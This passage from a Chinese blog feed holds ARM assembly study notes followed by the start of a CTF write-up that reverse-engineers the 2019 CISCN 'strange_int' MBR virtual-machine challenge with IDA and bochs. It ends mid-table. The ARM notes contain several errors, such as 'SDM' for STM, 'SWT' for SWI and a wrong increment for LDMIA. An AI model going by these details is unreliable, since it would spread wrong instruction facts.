处理器正常的程序执行状态。</li><li>快速中断模式：用于高速数据传输或通道处理。</li><li>外部中断模式：用于通用的中断处理。</li><li>管理模式：操作系统使用的保护模式。</li><li>数据访问终止模式：当数据或指令预取终止时进如该模式，可用于模拟存储及存储保护。</li><li>系统模式：运行具有特权的操作系统任务。</li><li>未定义指令中止模式：当未定义的指令执行时进入该模式。</li></ol></li></ol><blockquote><p>ARM 汇编难以分析的原因：IDA 自身的缺陷；函数库与类有时无法识别；自身对 ARM 汇编的熟练度。</p></blockquote><h2 id="函数参数传递"><a href="#函数参数传递" class="headerlink" title="函数参数传递"></a>函数参数传递</h2><p>遵循 ATPCS 规则，前 4 个参数使用 R0~R3 传递，剩余参数通过堆栈传递。</p><h2 id="ARM-和-Thumb"><a href="#ARM-和-Thumb" class="headerlink" title="ARM 和 Thumb"></a>ARM 和 Thumb</h2><p>Thumb 是 16 位的 ARM 汇编。一般地，ARM 每行代码占 4 个字节码，Thumb 每个指令占 2 个字节。两者不能混用，但可以通过 BX、BLX 等指令在跳转的时候实现切换。在动态调试的时候，IDA 对 ARM 和 Thumb 的分析会混淆，可以用 Alt+G 来修改相应的识别。</p><h2 id="ARM-寄存器"><a href="#ARM-寄存器" class="headerlink" title="ARM 寄存器"></a>ARM 寄存器</h2><ul><li>R0-R7：通用寄存器</li><li>R8-R10：不常用的通用寄存器</li><li>R11：基质寄存器（FP）</li><li>R12：暂时寄存器（IP）</li><li>R13：堆栈制作（SP）</li><li>R14：链接寄存器（LR）</li><li>CPSR：状态寄存器</li></ul><h2 id="ARM-指令"><a href="#ARM-指令" class="headerlink" title="ARM 指令"></a>ARM 指令</h2><h3 id="寄存器交互指令"><a href="#寄存器交互指令" class="headerlink" title="寄存器交互指令"></a>寄存器交互指令</h3><ul><li>LDR：从存储器中加载数据到寄存器。<ul><li><code>LDR R1, [R2]</code>：把 R2 指向的位置的数据给 R1</li></ul></li><li>STR：把寄存器的数据存储到存储器<ul><li><code>STR R1, [R2]</code>：在 R2 指向的地址，存储 R1</li></ul></li><li>LDM：将存储器的数据加载到一个寄存器列表。<ul><li><code>LDM R0, {R1, R2, R3}</code>：把 R0 中的数据一次加载到 R1、R2、R3</li></ul></li><li>SDM：将一个寄存器列表的数据存储到指定的存储器<ul><li><code>SDM R0, {R1, R2, R3}</code>：把 R1、R2、R3 加载到 R0 单元</li></ul></li><li>PUSH：入栈</li><li>POP：出栈</li></ul><h3 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h3><ul><li>MOV：将立即数或寄存器的数据传送到目标寄存器</li></ul><h3 id="数据算数运算指令"><a href="#数据算数运算指令" class="headerlink" title="数据算数运算指令"></a>数据算数运算指令</h3><h4 id="ADD（加法）"><a href="#ADD（加法）" class="headerlink" title="ADD（加法）"></a>ADD（加法）</h4><p>ADD 将把两个操作数加起来，把结果放置到目的寄存器中。操作数 1 是一个寄存器，操作数 2 可以是一个寄存器，被移位的寄存器，或一个立即值。</p><pre><code class="arm">ADD R0, R1, R2 @ R0 = R1 + R2ADD R0, R1, #256 @ R0 = R1 + 256ADD R0, R2, R3, LSL#1 @ R0 = R2 + (R3 &lt;&lt; 1)</code></pre><p>加法可以在有符号和无符号数上进行。</p><ul><li>ADC：带进位的加法</li></ul><h4 id="SUB（减法）"><a href="#SUB（减法）" class="headerlink" title="SUB（减法）"></a>SUB（减法）</h4><p>SUB 用操作数 1 减去操作数 2，把结果放置到目的寄存器中。操作数 1 是一个寄存器，操作数 2 可以是一个寄存器，被移位的寄存器，或一个立即值。</p><pre><code class="arm">SUB R0, R1, R2 @ R0 = R1 - R2SUB R0, R1, #256 @ R0 = R1 - 256SUB R0, R2, R3, LSL#1 @ R0 = R2 - (R3 &lt;&lt; 1)</code></pre><p>减法可以在有符号和无符号数上进行。</p><ul><li>SBC：带进位的减法</li></ul><h4 id="MUL（乘法）和-DIV（除法）"><a href="#MUL（乘法）和-DIV（除法）" class="headerlink" title="MUL（乘法）和 DIV（除法）"></a>MUL（乘法）和 DIV（除法）</h4><ul><li>给出的所有操作数、和目的寄存器必须为简单的寄存器。</li><li>不能对操作数 2 使用立即值或被移位的寄存器。</li><li>目的寄存器和操作数 1 必须是不同的寄存器。</li><li>不能指定 R15 为目的寄存器</li></ul><p>MUL 提供 32 位整数乘法。如果操作数是有符号的，可以假定结果也是有符号的。</p><ul><li>MLA：带累加的乘法</li></ul><p>除法指令 DIV 的条件与乘法类似。</p><ul><li>SDIV：带符号除法</li><li>UDIV：不带符号位除法</li></ul><h3 id="数据逻辑运算指令"><a href="#数据逻辑运算指令" class="headerlink" title="数据逻辑运算指令"></a>数据逻辑运算指令</h3><ul><li>AND：与</li><li>ORR：或</li><li>EOR：异或</li><li>LSL：逻辑左移</li><li>LSR：逻辑右移</li></ul><h3 id="比较指令"><a href="#比较指令" class="headerlink" title="比较指令"></a>比较指令</h3><ul><li>CMP：比较指令</li></ul><h3 id="其他指令"><a href="#其他指令" class="headerlink" title="其他指令"></a>其他指令</h3><ul><li>SWT：切换用户模式</li><li>DCB：伪指令</li></ul><h3 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h3><ul><li>B：无条件跳转</li><li>BL：带链接的无条件跳转</li><li>BLX：带状态的无条件跳转</li><li>BNE：不相等跳转</li><li>BEQ：相等跳转</li></ul><h4 id="偏移地址计算"><a href="#偏移地址计算" class="headerlink" title="偏移地址计算"></a>偏移地址计算</h4><ul><li>ARM：低 27 位是偏移位置<ul><li>偏移 = (目标地址 - 当前 PC 地址) / 指令长度</li><li>正数下跳，负数上跳</li></ul></li><li>Thumb 同理</li><li>目标地址 = 偏移 * 指令长度 + 当前偏移地址</li></ul><h2 id="ARM-代码编写"><a href="#ARM-代码编写" class="headerlink" title="ARM 代码编写"></a>ARM 代码编写</h2><p>处理器架构定义：</p><ul><li><code>.arch</code> 指定了 ARM 处理器架构。</li><li><code>armv5te</code> 表示本程序在 armv5te 架构处理器上运行。</li><li><code>.fpu</code> 指定了协处理器的类型。</li><li><code>softvfp</code> 表示使用浮点运算库来模拟协处理运算。</li><li><code>.ebi_attribute</code> 指定了一些接口属性。</li></ul><pre><code class="arm">.arch armv5te @处理器架构.fpu softvfp  @协处理器类型.ebi_attribute 20, 1 @接口属性.ebi_attribute 21, 1.ebi_attribute 23, 1.ebi_attribute 24, 1.ebi_attribute 25, 1.ebi_attribute 26, 1.ebi_attribute 30, 1.ebi_attribute 18, 1</code></pre><p>段定义：</p><ul><li><code>.section</code>：定义只读数据，属性是默认</li><li><code>.text</code>：定义了代码段。</li></ul><p>注释方法：</p><ul><li><code>/.../</code>：多行注释</li><li><code>@</code>：单行注释</li></ul><p>标号方式（和 8086 类似）：</p><pre><code class="arm">loop:    ...end loop</code></pre><p>程序中所有以“.”开头的指令都是汇编指令，他们不属于 ARM 指令集：</p><ul><li>.file：制定了源文件名。</li><li>.align：代码对其方式。</li><li>.ascii：声明字符串。</li><li>.global：声明全局变量。</li><li>.type：指定符号的类型。</li></ul><p>声明函数的方法：</p><pre><code class="arm">.global 函数名.type 函数名, %function函数名:    &lt;...函数体...&gt;声明一个实现两个数相加的函数的代码.global MyAdd.type MyAdd, &amp;functionMyAdd:    ADD R0, R0, R1    MOV PC, LR</code></pre><h2 id="ARM-处理器寻址方式"><a href="#ARM-处理器寻址方式" class="headerlink" title="ARM 处理器寻址方式"></a>ARM 处理器寻址方式</h2><h3 id="立即寻址"><a href="#立即寻址" class="headerlink" title="立即寻址"></a>立即寻址</h3><pre><code class="arm">@ 井号（#）作为前缀，表示16进制时以“0x”开头MOV R0，#1234 @ R0=0x1234</code></pre><h3 id="寄存器寻址"><a href="#寄存器寻址" class="headerlink" title="寄存器寻址"></a>寄存器寻址</h3><pre><code class="arm">MOV R0, R1 @ R0=R1</code></pre><h3 id="寄存器移位寻址"><a href="#寄存器移位寻址" class="headerlink" title="寄存器移位寻址"></a>寄存器移位寻址</h3><p>五种移位操作：</p><ul><li>LSL：逻辑左移，移位后寄存器空出的低位补 0；</li><li>LSR：逻辑右移，移位后寄存器空出的高位补 0；</li><li>ASR：算数右移，移动过程中符号位不变。如果操作数是整数，则移位后空出的高位补 0，否则补 1；</li><li>ROR：循环右移，移位后移出的低位填入移位空出的高位；</li><li>RRX：带扩展的循环右移，操作数右移移位，移位空出的高位用 C 标志的值填充。</li></ul><pre><code class="arm">MOV R0, R1, LSL#2 @ R0=R1*4</code></pre><h3 id="寄存器间接寻址"><a href="#寄存器间接寻址" class="headerlink" title="寄存器间接寻址"></a>寄存器间接寻址</h3><pre><code class="arm">LDR R0，[R1] @ 将R1寄存器中的值作为地址，取出地址中的值赋予R0</code></pre><h3 id="寄存器间接基址偏移寻址"><a href="#寄存器间接基址偏移寻址" class="headerlink" title="寄存器间接基址偏移寻址"></a>寄存器间接基址偏移寻址</h3><pre><code class="arm">LDR R0, [R1, #-4] @ 将R1寄存器的值-0x4的值作为地址，取出地址中的值给R0</code></pre><h3 id="多寄存器寻址"><a href="#多寄存器寻址" class="headerlink" title="多寄存器寻址"></a>多寄存器寻址</h3><pre><code class="arm">@ LDM 是数据加载命令，指令的后缀IA表示每次执行完成加载操作后R0寄存器的值自增1LDMIA R0, {R1, R2, R3, R4}@ R1=[R0]@ R2=[R0+#4]@ R3=[R0+#8]@ R4=[R0+#12]@ ARM中，字表示的是一个32位。这里+#4的原因是因为32位占4个字节</code></pre><h3 id="堆栈寻址"><a href="#堆栈寻址" class="headerlink" title="堆栈寻址"></a>堆栈寻址</h3><pre><code class="arm">STMFD SP!, {R1-R7, LR} @ 入栈，多用于保存子程序堆栈LDMFD SP!, {R1-R7, LR} @ 出栈，多用于恢复子程序堆栈</code></pre><h3 id="块拷贝寻址"><a href="#块拷贝寻址" class="headerlink" title="块拷贝寻址"></a>块拷贝寻址</h3><p>块拷贝可实现连续地址数据从存储器的某一位置拷贝到另一位置。</p><pre><code class="arm">LDMIA R0!, {R1-R3} @ 从寄存器指向的存储单元中读取3个字到R1-R3寄存器。</code></pre><h3 id="相对寻址"><a href="#相对寻址" class="headerlink" title="相对寻址"></a>相对寻址</h3><p>相对寻址一程序计数器 PC 的当前值为基地址，指令中的地址标号作为偏移量，将两者相加之后得到的操作数的有效地址。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.bilibili.com/video/av45424886" target="_blank" rel="noopener">https://www.bilibili.com/video/av45424886</a><br><a href="https://blog.csdn.net/miao_007/article/details/87632758" target="_blank" rel="noopener">https://blog.csdn.net/miao_007/article/details/87632758</a><br><a href="https://stackoverflow.com/questions/4629308/any-simple-way-to-log-in-android-ndk-code" target="_blank" rel="noopener">https://stackoverflow.com/questions/4629308/any-simple-way-to-log-in-android-ndk-code</a><br><a href="https://www.jianshu.com/p/acbf724fdcc9" target="_blank" rel="noopener">https://www.jianshu.com/p/acbf724fdcc9</a><br><a href="https://blog.csdn.net/afei__/article/details/81031965" target="_blank" rel="noopener">https://blog.csdn.net/afei__/article/details/81031965</a><br><a href="https://www.luoxudong.com/360.html" target="_blank" rel="noopener">https://www.luoxudong.com/360.html</a><br><a href="https://www.jianshu.com/p/23af9151837e" target="_blank" rel="noopener">https://www.jianshu.com/p/23af9151837e</a><br><a href="https://juejin.im/post/5afe28446fb9a07aa0483d0a" target="_blank" rel="noopener">https://juejin.im/post/5afe28446fb9a07aa0483d0a</a><br><a href="https://www.52pojie.cn/thread-699268-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-699268-1-1.html</a><br><a href="https://www.52pojie.cn/thread-673175-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-673175-1-1.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2019-CISCN-strange_int</title>
    <link href="/2020/01/24/2019-CISCN-strange-int/"/>
    <url>/2020/01/24/2019-CISCN-strange-int/</url>
    
    <content type="html"><![CDATA[<p>一道 MBR 虚拟机的题目，同时也熟悉了使用 bochs 对 MBR 的调试。</p><a id="more"></a><h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><pre><code>$ file Image.binImage.bin: DOS/MBR boot sector</code></pre><p>先在 IDA 中 16 位的模式打开。在 7C00~7C0E 的代码（MBR 的加载地址是 0x7C00 处）是对寄存器和栈指针进行初始化操作；在 7C0F~7C12 的代码是 x86 系统中的第 17 号调用，设置了显示模式；在 7C14~7C24 的代码是 x86 系统中的第 20 号调用，从软盘的第 0 个磁盘第 0 个柱面第 2 个扇区开始的共 28 个扇区读取数据到内存的 10000000 处；在 7C2B~7C3B 的代码将内存中 10000000~10002000 的数据赋值给内存 0~2000 处；在 7C3D~7C47 的代码初始化 IDT 和 GDT；在 7C4C~7C52 的代码处，启动保护模式，并跳转至 32 位代码段：</p><pre><code class="asm">MBR16:0000 sub_0           proc nearMBR16:0000                 jmp     far ptr 7C0h:5MBR16:0000 sub_0           endpMBR16:0000MBR16:0005MBR16:0005 ; =============== S U B R O U T I N E =======================================MBR16:0005MBR16:0005MBR16:0005 sub_5           proc nearMBR16:0005                 mov     ax, csMBR16:0007                 mov     ds, axMBR16:0009                 assume ds:MBR16MBR16:0009                 mov     ss, axMBR16:000B                 assume ss:MBR16MBR16:000B                 mov     sp, 400hMBR16:000E                 cldMBR16:000F                 mov     ax, 3MBR16:0012                 int     10h             ; - VIDEO - SET VIDEO MODEMBR16:0012                                         ; AL = modeMBR16:0014                 mov     dx, 0MBR16:0017                 mov     cx, 2MBR16:001A                 mov     ax, 1000hMBR16:001D                 mov     es, axMBR16:001F                 assume es:nothingMBR16:001F                 xor     bx, bxMBR16:0021                 mov     ax, 228hMBR16:0024                 int     13h             ; DISK - READ SECTORS INTO MEMORYMBR16:0024                                         ; AL = number of sectors to read, CH = track, CL = sectorMBR16:0024                                         ; DH = head, DL = drive, ES:BX -&gt; buffer to fillMBR16:0024                                         ; Return: CF set on error, AH = status, AL = number of sectors readMBR16:0026                 jnb     short loc_2AMBR16:0028MBR16:0028 loc_28:                                 ; CODE XREF: sub_5:loc_28↓jMBR16:0028                 jmp     short loc_28MBR16:002A ; ---------------------------------------------------------------------------MBR16:002AMBR16:002A loc_2A:                                 ; CODE XREF: sub_5+21↑jMBR16:002A                 cliMBR16:002B                 mov     ax, 1000hMBR16:002E                 mov     ds, axMBR16:0030                 assume ds:nothingMBR16:0030                 xor     ax, axMBR16:0032                 mov     es, axMBR16:0034                 assume es:MBR16MBR16:0034                 mov     cx, 2000hMBR16:0037                 sub     si, siMBR16:0039                 sub     di, diMBR16:003B                 rep movsbMBR16:003D                 mov     ax, 7C0hMBR16:0040MBR16:0040 loc_40:                                 ; DATA XREF: sub_5+D↑rMBR16:0040                 mov     ds, axMBR16:0042                 assume ds:nothingMBR16:0042                 lidt    fword ptr ds:6Fh ; Init IDTMBR16:0047                 lgdt    fword ptr ds:75h ; Init GDTMBR16:004CMBR16:004C loc_4C:                                 ; DATA XREF: sub_5+1F↑rMBR16:004C                 mov     ax, 1            ; Start Protected ModeMBR16:004F                 lmsw    ax               ; Jump to 32-bit CodeMBR16:004F sub_5           endpMBR16:004FMBR16:004F MBR16           ends</code></pre><blockquote><h2 id="何为-IDT-和-GDT？"><a href="#何为-IDT-和-GDT？" class="headerlink" title="何为 IDT 和 GDT？"></a>何为 IDT 和 GDT？</h2><h3 id="GDT"><a href="#GDT" class="headerlink" title="GDT"></a>GDT</h3><p>全局描述表（Global Descriptor Table）。在实时模式下，对一个内存地址的访问是通过段寄存器的方式来进行（一个段具备两个元素：[Base Address, Limit]），即段模式。而在保护模式下（保护模式运行在 32 位系统上），内存的管理模式分为两种，段模式和页模式，其中页模式也是基于段模式的（纯段模式和段页模式）。</p><p>在保护模式下，对一个段的描述则包括 3 方面因素：[Base Address, Limit, Access]，它们加在一起被放在一个 64-bit 长的数据结构中，被称为段描述符。而段寄存器仍然是 16-bit，无法通过 16-bit 长度的段寄存器来直接引用 64-bit 的段描述符。</p><p>解决方法就是把这些长度为 64-bit 的段描述符放入一个数组即 GDT 中。当程序员通过段寄存器来引用一个段描述符时，CPU 必须知道 GDT 的入口，也就是基地址放在哪里，所以 Intel 的设计者门提供了一个寄存器 GDTR 用来存放 GDT 的入口地址，程序员将 GDT 设定在内存中某个位置之后，可以通过 LGDT 指令将 GDT 的入口地址装入此寄存器，从此以后，CPU 就根据此寄存器中的内容作为 GDT 的入口来访问 GDT 了。</p><h3 id="IDT"><a href="#IDT" class="headerlink" title="IDT"></a>IDT</h3><p>中断描述符表（Interrupt Descriptor Table），和 GDT 类似，记录了 0~255 的中断号和调用函数之间的关系。</p><p>段描述符使用数组存储，使用 LIDT 指令将 IDT 的入口地址装入 IDTR 寄存器。</p></blockquote><p>接下来在 IDA 中用 32 位模式打开。一开始的一段代码对 IDT 和 GDT 进行了初始化：</p><pre><code class="asm">seg001:00000205 sub_205         proc nearseg001:00000205                 mov     ds, eaxseg001:00000207                 lss     esp, fword ptr ds:dword_B34+28hseg001:0000020E                 call    IDT_Initseg001:00000213                 call    GDT_Initseg001:00000218                 mov     eax, 10h        ; DATA XREF: sub_28B+27↓rseg001:0000021D                 mov     ds, eaxseg001:0000021F                 assume ds:nothingseg001:0000021F                 mov     es, eaxseg001:00000221                 assume es:nothingseg001:00000221                 mov     fs, eax         ; DATA XREF: sub_283↓rseg001:00000223                 assume fs:nothingseg001:00000223                 mov     gs, eaxseg001:00000225                 assume gs:nothingseg001:00000225                 lss     esp, large ds:0B5Chseg001:00000225                                         ; DATA XREF: sub_28B+11↓oseg001:0000022C                 xor     ebx, ebx</code></pre><p>IDT_init 处，先将 000800FC 赋给了 EAX，将 8E00 赋给了 DX。然后进行了一个 256 次的循环，每次循环从 00080128 的地址开始，分别存入 EAX 和 EDX。最后加载 IDTR，地址为 11C。</p><pre><code class="asm">seg001:0000028B IDT_Init        proc near               ; CODE XREF: sub_205+9↑pseg001:0000028B                 mov     edx, 0FChseg001:00000290                 mov     eax, 80000hseg001:00000295                 mov     ax, dxseg001:00000298                 mov     dx, 8E00hseg001:0000029C                 lea     edi, ds:128hseg001:000002A2                 mov     ecx, 100hseg001:000002A7seg001:000002A7 loc_2A7:                                ; CODE XREF: IDT_Init+25↓jseg001:000002A7                 mov     [edi], eaxseg001:000002A9                 mov     [edi+4], edxseg001:000002AC                 add     edi, 8seg001:000002AF                 dec     ecxseg001:000002B0                 jnz     short loc_2A7seg001:000002B2                 lidt    large fword ptr ds:11Chseg001:000002B9                 retnseg001:000002B9 IDT_Init        endp</code></pre><p>在 bogus 中调试得到 IDTR 中的值为 0x012807ff（可以使用 show mode 命令来判断实模式向保护模式的转换）。依据之前的知识，可以知道基址为 0x0128 以及长度为 0x07ff：</p><pre><code class="bochs">&lt;bochs:40&gt; x 0x11c[bochs]:0x000000000000011c &lt;bogus+       0&gt;:    0x012807ff</code></pre><p>中断门描述符被初始化为 <code>0000 8e00 0008 00fc</code>（偏移：0xfc；段选择符：0x8；P：1，即段是否在内存；DPL：0），如下：</p><pre><code>&lt;bochs:79&gt; x/20 0x128[bochs]:0x0000000000000128 &lt;bogus+       0&gt;:    0x000800fc    0x00008e00    0x000800fc    0x00008e000x0000000000000138 &lt;bogus+      16&gt;:    0x000800fc    0x00008e00    0x000800fc    0x00008e000x0000000000000148 &lt;bogus+      32&gt;:    0x000800fc    0x00008e00    0x000800fc    0x00008e000x0000000000000158 &lt;bogus+      48&gt;:    0x000800fc    0x00008e00    0x000800fc    0x00008e000x0000000000000168 &lt;bogus+      64&gt;:    0x000800fc    0x00008e00    0x000800fc    0x00008e00</code></pre><p>GDT_init 处，加载 GDTR 的地址为 122：</p><pre><code class="asm">seg001:00000283 GDT_Init        proc near               ; CODE XREF: sub_205+E↑pseg001:00000283                 lgdt    large fword ptr ds:122hseg001:0000028A                 retnseg001:0000028A GDT_Init        endp</code></pre><p>同理，可以知道 GDT 基址为 0x0928 以及长度为 0x001f。不过这里没有对 GDT 进行初始化：</p><pre><code class="bochs">&lt;bochs:74&gt; x 0x122[bochs]:0x0000000000000122 &lt;bogus+       0&gt;:    0x0928001f</code></pre><p>在 22E~25F 的代码执行了一个 16 次的循环，其中 0x21~0x30 的中断向量描述符在内存的原始位置在 D08 处，循环中将每个中断向量存储到 128 处；然后调用了 NextHandler 函数，最后调用 <code>INT 21H</code>。</p><pre><code class="asm">seg001:0000022E loc_22E:                                ; CODE XREF: sub_205+58↓jseg001:0000022E                 nopseg001:0000022F                 cmp     ebx, 10hseg001:00000232                 jge     short loc_25Fseg001:00000234                 mov     eax, 80000hseg001:00000239                 lea     edx, ds:0D08h[ebx*4]seg001:00000240                 mov     edx, [edx]seg001:00000242                 mov     ax, dxseg001:00000245                 mov     dx, 8E00hseg001:00000249                 mov     ecx, 21h ; &#39;!&#39;seg001:0000024E                 add     ecx, ebxseg001:00000250                 lea     esi, ds:128h[ecx*8]seg001:00000257                 mov     [esi], eaxseg001:00000259                 mov     [esi+4], edxseg001:0000025C                 inc     ebxseg001:0000025D                 jmp     short loc_22Eseg001:0000025F ; ---------------------------------------------------------------------------seg001:0000025Fseg001:0000025F loc_25F:                                ; CODE XREF: sub_205+2D↑jseg001:0000025F                                         ; sub_205+61↓jseg001:0000025F                 call    NextHandlerseg001:00000264                 int     21h             ; DOS -seg001:00000266                 jmp     short loc_25Fseg001:00000266 sub_205         endp</code></pre><p>获取得到所有中断向量的地址如下：</p><pre><code>...IDT[0x21]=32-Bit Interrupt Gate target=0x0008:0x00000b7c, DPL=0IDT[0x22]=32-Bit Interrupt Gate target=0x0008:0x00000b8a, DPL=0IDT[0x23]=32-Bit Interrupt Gate target=0x0008:0x00000ba1, DPL=0IDT[0x24]=32-Bit Interrupt Gate target=0x0008:0x00000bc1, DPL=0IDT[0x25]=32-Bit Interrupt Gate target=0x0008:0x00000be1, DPL=0IDT[0x26]=32-Bit Interrupt Gate target=0x0008:0x00000bfc, DPL=0IDT[0x27]=32-Bit Interrupt Gate target=0x0008:0x00000c17, DPL=0IDT[0x28]=32-Bit Interrupt Gate target=0x0008:0x00000c32, DPL=0IDT[0x29]=32-Bit Interrupt Gate target=0x0008:0x00000c4f, DPL=0IDT[0x2a]=32-Bit Interrupt Gate target=0x0008:0x00000c6c, DPL=0IDT[0x2b]=32-Bit Interrupt Gate target=0x0008:0x00000c84, DPL=0IDT[0x2c]=32-Bit Interrupt Gate target=0x0008:0x00000c96, DPL=0IDT[0x2d]=32-Bit Interrupt Gate target=0x0008:0x00000cb5, DPL=0IDT[0x2e]=32-Bit Interrupt Gate target=0x0008:0x00000cf7, DPL=0IDT[0x2f]=32-Bit Interrupt Gate target=0x0008:0x00000ce0, DPL=0IDT[0x30]=32-Bit Interrupt Gate target=0x0008:0x00000cd4, DPL=0...</code></pre><p>在 IDA 中定位到所有中断向量的地址，分别对应着不同的函数，这一段代码后面会用到：</p><pre><code class="asm">seg001:00000D7C                 lea     ecx, ds:0B64h[ecx*4]seg001:00000D83                 mov     [ecx], eaxseg001:00000D85                 jmp     loc_EF8seg001:00000D8A ; ---------------------------------------------------------------------------seg001:00000D8A                 lea     eax, ds:0B64h[eax*4]seg001:00000D91                 mov     eax, [eax]seg001:00000D93                 lea     ecx, ds:0B64h[ecx*4]seg001:00000D9A                 mov     [ecx], eaxseg001:00000D9C                 jmp     loc_EF8seg001:00000DA1 ; ---------------------------------------------------------------------------seg001:00000DA1                 lea     eax, ds:0B64h[eax*4]seg001:00000DA8                 mov     eax, [eax]seg001:00000DAA                 lea     ecx, ds:0B64h[ecx*4]seg001:00000DB1                 lea     eax, ds:0D48h[eax*4]seg001:00000DB8                 mov     eax, [eax]seg001:00000DBA                 mov     [ecx], eaxseg001:00000DBC                 jmp     loc_EF8seg001:00000DC1 ; ---------------------------------------------------------------------------seg001:00000DC1                 lea     eax, ds:0B64h[eax*4]seg001:00000DC8                 mov     eax, [eax]seg001:00000DCA                 lea     ecx, ds:0B64h[ecx*4]seg001:00000DD1                 mov     ecx, [ecx]seg001:00000DD3                 lea     ecx, ds:0D48h[ecx*4]seg001:00000DDA                 mov     [ecx], eaxseg001:00000DDC                 jmp     loc_EF8seg001:00000DE1 ; ---------------------------------------------------------------------------seg001:00000DE1                 lea     eax, ds:0B64h[eax*4]seg001:00000DE8                 mov     edx, [eax]seg001:00000DEA                 lea     ecx, ds:0B64h[ecx*4]seg001:00000DF1                 mov     eax, [ecx]seg001:00000DF3                 add     eax, edxseg001:00000DF5                 mov     [ecx], eaxseg001:00000DF7                 jmp     loc_EF8seg001:00000DFC ; ---------------------------------------------------------------------------seg001:00000DFC                 lea     eax, ds:0B64h[eax*4]seg001:00000E03                 mov     edx, [eax]seg001:00000E05                 lea     ecx, ds:0B64h[ecx*4]seg001:00000E0C                 mov     eax, [ecx]seg001:00000E0E                 sub     eax, edxseg001:00000E10                 mov     [ecx], eaxseg001:00000E12                 jmp     loc_EF8seg001:00000E17 ; ---------------------------------------------------------------------------seg001:00000E17                 lea     eax, ds:0B64h[eax*4]seg001:00000E1E                 mov     edx, [eax]seg001:00000E20                 lea     ecx, ds:0B64h[ecx*4]seg001:00000E27                 mov     eax, [ecx]seg001:00000E29                 xor     eax, edxseg001:00000E2B                 mov     [ecx], eaxseg001:00000E2D                 jmp     loc_EF8seg001:00000E32 ; ---------------------------------------------------------------------------seg001:00000E32                 lea     eax, ds:0B64h[eax*4]seg001:00000E39                 mov     eax, [eax]seg001:00000E3B                 lea     edx, ds:0B64h[ecx*4]seg001:00000E42                 mov     cl, alseg001:00000E44                 mov     eax, [edx]seg001:00000E46                 shl     eax, clseg001:00000E48                 mov     [edx], eaxseg001:00000E4A                 jmp     loc_EF8seg001:00000E4F ; ---------------------------------------------------------------------------seg001:00000E4F                 lea     eax, ds:0B64h[eax*4]seg001:00000E56                 mov     eax, [eax]seg001:00000E58                 lea     edx, ds:0B64h[ecx*4]seg001:00000E5F                 mov     cl, alseg001:00000E61                 mov     eax, [edx]seg001:00000E63                 shr     eax, clseg001:00000E65                 mov     [edx], eaxseg001:00000E67                 jmp     loc_EF8seg001:00000E6C ; ---------------------------------------------------------------------------seg001:00000E6C                 lea     eax, ds:0B64h[eax*4]seg001:00000E73                 mov     eax, [eax]seg001:00000E75                 lea     ecx, ds:0B64h[ecx*4]seg001:00000E7C                 mov     edx, [ecx]seg001:00000E7E                 and     eax, edxseg001:00000E80                 mov     [ecx], eaxseg001:00000E82                 jmp     short loc_EF8seg001:00000E84 ; ---------------------------------------------------------------------------seg001:00000E84                 lea     eax, ds:0B64h[ecx*4]seg001:00000E8B                 mov     eax, [eax]seg001:00000E8D                 lea     ecx, dword_B34+44hseg001:00000E93                 mov     [ecx], eaxseg001:00000E95                 iretseg001:00000E96 ; ---------------------------------------------------------------------------seg001:00000E96                 lea     eax, ds:0B64h[eax*4]seg001:00000E9D                 mov     eax, [eax]seg001:00000E9F                 test    eax, eaxseg001:00000EA1                 jnz     short loc_EF8seg001:00000EA3                 lea     eax, ds:0B64h[ecx*4]seg001:00000EAA                 mov     eax, [eax]seg001:00000EAC                 lea     ecx, dword_B34+44hseg001:00000EB2                 mov     [ecx], eaxseg001:00000EB4                 iretseg001:00000EB5 ; ---------------------------------------------------------------------------seg001:00000EB5                 lea     eax, ds:0B64h[eax*4]seg001:00000EBC                 mov     eax, [eax]seg001:00000EBE                 test    eax, eaxseg001:00000EC0                 jz      short loc_EF8seg001:00000EC2                 lea     eax, ds:0B64h[ecx*4]seg001:00000EC9                 mov     eax, [eax]seg001:00000ECB                 lea     ecx, dword_B34+44hseg001:00000ED1                 mov     [ecx], eaxseg001:00000ED3                 iretseg001:00000ED4 ; ---------------------------------------------------------------------------seg001:00000ED4                 lea     eax, unk_F94seg001:00000EDA                 call    sub_2EAseg001:00000EDF                 hltseg001:00000EE0 ; ---------------------------------------------------------------------------seg001:00000EE0                 lea     eax, unk_FA0seg001:00000EE6                 call    sub_2EAseg001:00000EEB                 lea     eax, word_FAEseg001:00000EF1                 call    sub_2EAseg001:00000EF6                 hlt</code></pre><p>接下来在 NextHandler 处，包括 <code>INT 21H</code> 的三条指令，类似于一个 switch 语句，根据以前的做题经验，基本可以判断出是个虚拟机。在 NextHandler 函数中，首先从 B78 处获取值作为 D48 的偏移，将 D48 处的值分别赋值给 给 065（操作符）、ecx（操作数 1）、eax（操作数 2），而 065 地址处的值为 21H，即指令 <code>INT 21H</code> 的操作数，故这里中断的调用是和 edi 的取值有关系的：</p><pre><code class="asm">seg001:00000268 NextHandler     proc near               ; CODE XREF: sub_205:loc_25F↑pseg001:00000268                 mov     edi, large ds:0B78hseg001:0000026E                 lea     edi, ds:0D48h[edi*4]seg001:00000275                 mov     eax, [edi]seg001:00000277                 mov     large ds:65h, alseg001:0000027C                 mov     ecx, [edi+4]seg001:0000027F                 mov     eax, [edi+8]seg001:00000282                 retnseg001:00000282 NextHandler     endp</code></pre><p>回过去看上面中断代码的最后一部分是将上面 edi 中的值加 3，即取下一组指令：</p><pre><code class="asm">seg001:00000EF8 loc_EF8:                                ; CODE XREF: seg001:00000D85↑jseg001:00000EF8                                         ; seg001:00000D9C↑j ...seg001:00000EF8                 lea     ecx, dword_B34+44hseg001:00000EFE                 mov     eax, [ecx]seg001:00000F00                 add     eax, 3seg001:00000F03                 mov     [ecx], eaxseg001:00000F05                 iret</code></pre><p>那么之前的那段代码就是不同的操作符时进行的中断调用。这里就先把每个中断的部分的代码进行翻译（buf 的地址为 B64，code 的地址为 D48，pc 的地址为 B78）：</p><table><thead><tr><th style="text-align:center">中断编号</th><th style="text-align:center">功能描述</th></tr></thead><tbody><tr><td style="text-align:center">0x21</td><td 